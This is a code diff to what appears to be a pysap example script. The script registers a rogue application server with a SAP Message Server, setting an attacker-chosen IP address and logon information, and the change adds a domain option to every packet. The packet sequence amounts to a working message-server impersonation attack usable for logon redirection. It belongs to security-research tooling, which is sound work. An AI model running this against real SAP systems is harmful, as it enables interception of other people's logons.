@@ -25,8 +25,8 @@ from optparse import OptionParser, OptionGroup
 from scapy.config import conf
 # Custom imports
 import pysap
-from pysap.SAPMS import SAPMS, SAPMSProperty, SAPMSLogon
 from pysap.SAPRouter import SAPRoutedStreamSocket
+from pysap.SAPMS import SAPMS, SAPMSProperty, SAPMSLogon, ms_domain_values_inv
 
 
 # Set the verbosity to 0
@@ -57,6 +57,8 @@ def parse_options():
                       help="Logon address")
     target.add_option("--route-string", dest="route_string",
                       help="Route string for connecting through a SAP Router")
+    target.add_option("--domain", dest="domain", default="ABAP",
+                      help="Domain to connect to (ABAP, J2EE or JSTARTUP) [%default]")
     parser.add_option_group(target)
 
     misc = OptionGroup(parser, "Misc options")
@@ -72,6 +74,8 @@ def parse_options():
         parser.error("Remote host or route string is required")
     if not options.logon_address:
         parser.error("Logon address is required")
+    if options.domain not in ms_domain_values_inv.keys():
+        parser.error("Invalid domain specified")
 
     return options
 
@@ -83,6 +87,8 @@ def main():
     if options.verbose:
         logging.basicConfig(level=logging.DEBUG)
 
+    domain = ms_domain_values_inv[options.domain]
+
     # Initiate the connection
     conn = SAPRoutedStreamSocket.get_nisocket(options.remote_host,
                                               options.remote_port,
@@ -92,24 +98,24 @@ def main():
 
     # Set release information
     prop = SAPMSProperty(id=7, release="720", patchno=70, supplvl=0, platform=0)
-    p = SAPMS(flag=0x01, iflag=0x01, toname="MSG_SERVER", fromname=options.client, opcode=0x43, property=prop)
+    p = SAPMS(flag=0x01, iflag=0x01, domain=domain, toname="MSG_SERVER", fromname=options.client, opcode=0x43, property=prop)
     print("[*] Setting release information")
     conn.send(p)
 
     # Perform the login enabling the DIA+BTC+ICM services
-    p = SAPMS(flag=0x08, iflag=0x08, msgtype=0x89, toname="-", fromname=options.client)
+    p = SAPMS(flag=0x08, iflag=0x08, msgtype=0x89, domain=domain, toname="-", fromname=options.client)
     print("[*] Sending login packet")
     conn.sr(p)[SAPMS]
     print("[*] Login performed")
 
     # Changing the status to starting
-    p = SAPMS(flag=0x01, iflag=0x09, msgtype=0x05, toname="-", fromname=options.client)
+    p = SAPMS(flag=0x01, iflag=0x09, msgtype=0x05, domain=domain, toname="-", fromname=options.client)
     print("[*] Changing server's status to starting")
     conn.send(p)
 
     # Set IP address
-    p = SAPMS(flag=0x01, iflag=0x01, toname="MSG_SERVER", fromname=options.client, opcode=0x06, opcode_version=0x01,
-              change_ip_addressv4=options.logon_address)
+    p = SAPMS(flag=0x01, iflag=0x01, domain=domain, toname="MSG_SERVER", fromname=options.client, opcode=0x06,
+              opcode_version=0x01, change_ip_addressv4=options.logon_address)
     print("[*] Setting IP address")
     response = conn.sr(p)[SAPMS]
     print("[*] IP address set")
@@ -117,7 +123,8 @@ def main():
 
     # Set logon information
     l = SAPMSLogon(type=2, port=3200, address=options.logon_address, host=options.client, misc="LB=3")
-    p = SAPMS(flag=0x01, iflag=0x01, msgtype=0x01, toname="MSG_SERVER", fromname=options.client, opcode=0x2b, logon=l)
+    p = SAPMS(flag=0x01, iflag=0x01, msgtype=0x01, domain=domain, toname="MSG_SERVER", fromname=options.client,
+              opcode=0x2b, logon=l)
     print("[*] Setting logon information")
     response = conn.sr(p)[SAPMS]
     print("[*] Logon information set")
@@ -125,7 +132,7 @@ def main():
 
     # Set the IP Address property
     prop = SAPMSProperty(client=options.client, id=0x03, address=options.logon_address)
-    p = SAPMS(flag=0x02, iflag=0x01, toname="-", fromname=options.client,
+    p = SAPMS(flag=0x02, iflag=0x01, domain=domain, toname="-", fromname=options.client,
               opcode=0x43, property=prop)
     print("[*] Setting IP address property")
     response = conn.sr(p)[SAPMS]
@@ -133,7 +140,7 @@ def main():
     response.show()
 
     # Changing the status to active
-    p = SAPMS(flag=0x01, iflag=0x09, msgtype=0x01, toname="-", fromname=options.client)
+    p = SAPMS(flag=0x01, iflag=0x09, msgtype=0x01, domain=domain, toname="-", fromname=options.client)
     print("[*] Changing server's status to active")
     conn.send(p)
 
@@ -147,7 +154,7 @@ def main():
         print("[*] Cancelled by the user !")
 
     # Send MS_LOGOUT packet
-    p = SAPMS(flag=0x00, iflag=0x04, toname="MSG_SERVER", fromname=options.client)
+    p = SAPMS(flag=0x00, iflag=0x04, domain=domain, toname="MSG_SERVER", fromname=options.client)
     print("[*] Sending logout packet")
     conn.send(p)
 
